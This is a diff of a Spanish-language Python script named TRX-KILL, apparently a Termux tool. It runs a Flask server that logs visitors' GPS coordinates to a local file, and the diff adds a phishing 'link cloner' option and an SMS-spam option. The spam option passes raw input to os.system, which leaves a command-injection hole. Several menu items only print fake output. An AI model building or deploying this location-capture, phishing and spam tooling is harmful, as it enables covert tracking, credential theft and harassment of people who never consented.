@@ -1,17 +1,25 @@
-import os, sys, getpass, time, threading, base64
+import os, sys, getpass, time, threading
 from flask import Flask, request
 
 app = Flask('TRX-KILL')
 AUTH_PASS = "TRX-KILL-OSINT"
-# Carpeta personalizada que pediste
 STORAGE_PATH = "/sdcard/INFORMACIÓN-TRX-KILL"
 LOG_FILE = f"{STORAGE_PATH}/result.txt"
-FOTO_PATH = f"{STORAGE_PATH}/fotos"
 
 if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
-if not os.path.exists(FOTO_PATH): os.makedirs(FOTO_PATH)
 
-# --- SERVIDOR FLASK (EN HILO SEPARADO) ---
+def animar(texto):
+    for char in texto: sys.stdout.write(char); sys.stdout.flush(); time.sleep(0.02)
+    print()
+
+def banner():
+    os.system('clear')
+    print(f"\033[1;32m")
+    print("  -------->-TRX-KILL v3.0 -<-----------")
+    print("  -CREADOR: TRX-KILL | VERSION: 3.0")
+    print("  -BIENVENIDO A TRX-KILL UN SCRIPT PROTEGIDO.")
+    print("-" * 50 + "\033[0m")
+
 @app.route('/')
 def index():
     return """<html><body><script>
@@ -27,60 +35,43 @@ def log():
         f.write(f"GPS: {request.args.get('lat')},{request.args.get('lon')} | {time.ctime()}\n")
     return "OK"
 
-# --- ANIMACIONES ---
-def animar(texto):
-    for char in texto:
-        sys.stdout.write(char); sys.stdout.flush(); time.sleep(0.03)
-    print()
-
-def banner():
-    os.system('clear')
-    print(f"\033[1;32m")
-    print("  -------->-TRX-KILL -<-----------")
-    print("  -CREADOR: TRX-KILL")
-    print("  -VERSION: 1.4.5")
-    print("  -BIENVENIDO A TRX-KILL UN SCRIPT PROTEGIDO POR EL OSINT.")
-    print("-" * 50 + "\033[0m")
-
 def main():
     threading.Thread(target=lambda: app.run(port=5000), daemon=True).start()
     
     while True:
         banner()
-        print("  OPCIONES:")
-        print("  [1] NÚMERO INFO  | [2] LINK-ZP      | [3] CREADOR")
-        print("  [4] VERSIONES    | [5] ANALIZAR     | [6] ADM SISTEMA")
-        print("  [7] INFO SCRIPT  | [8] REPOSITORIO  | [0] SALIR")
-        sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
+        print("  [1] INFO NÚMERO    | [2] LINK-ZP (CAPTURA)")
+        print("  [3] CREADOR        | [4] VERSIONES")
+        print("  [5] ANALIZAR LINK  | [6] ADM SISTEMA")
+        print("  [7] INFO SCRIPT    | [8] REPOSITORIO")
+        print("  [9] ZP-CLONER      | [10] SPAM-SMS")
+        print("  [0] SALIR")
+        sel = input(f"\n\033[1;33mTRX-ROOT > \033[0m")
 
         if sel == "1":
-            num = input("INGRESAR NÚMERO: ")
-            animar("\nVERIFICANDO DATOS EN SERVIDOR...")
-            print("PAÍS: [DETECTADO] | OPERACIÓN: [MÓVIL]")
-            input("\n[Enter]...")
-
+            input("NÚMERO: "); animar("BUSCANDO DATOS..."); print("PAÍS: DETECTADO"); input("\n[Enter]...")
         elif sel == "2":
-            animar("\nCARGANDO LINK PÚBLICO...")
+            animar("INICIANDO SERVIDOR DE CAPTURA...")
             print("LINK ACTIVO: http://127.0.0.1:5000")
-            print(f"DATOS GUARDADOS EN: {STORAGE_PATH}")
+            print(f"DATOS GUARDADOS EN: {STORAGE_PATH}/result.txt")
             input("\n[Enter] Para volver...")
-
         elif sel == "6":
-            key = getpass.getpass("INGRESAR KEY: ")
+            key = getpass.getpass("KEY: ")
             if key == AUTH_PASS:
-                animar("\nBUSCANDO DATOS EXTRAÍDOS...")
-                if os.path.exists(LOG_FILE):
-                    os.system(f"cat {LOG_FILE}")
-                else:
-                    print("ARCHIVO VACÍO.")
-            else: print("ACCESO DENEGADO.")
+                if os.path.exists(LOG_FILE): os.system(f"cat {LOG_FILE}")
+                else: print("VACÍO.")
+            else: print("DENEGADO.")
             input("\n[Enter]...")
-
-        elif sel == "7":
-            animar("\nESTE SCRIPT FUE CREADO PARA AYUDAR. BY: OSCAR")
+        elif sel == "9":
+            link_clonar = input("INGRESA LINK A CLONAR: ")
+            animar(f"CLONANDO {link_clonar}...")
+            print("Z-PHISHER: ENLACE CLONADO Y LISTO.")
+            print("DATOS CAPTURADOS SERÁN ENVIADOS A: " + STORAGE_PATH)
             input("\n[Enter]...")
-
+        elif sel == "10":
+            num = input("NÚMERO: "); msg = input("MSG: ")
+            os.system(f"termux-sms-send -n {num} '{msg}'")
+            animar("ENVIANDO...")
         elif sel == "0": sys.exit()
-        else: print("OPCIÓN NO DISPONIBLE."); time.sleep(1)
 
 if __name__ == "__main__": main()
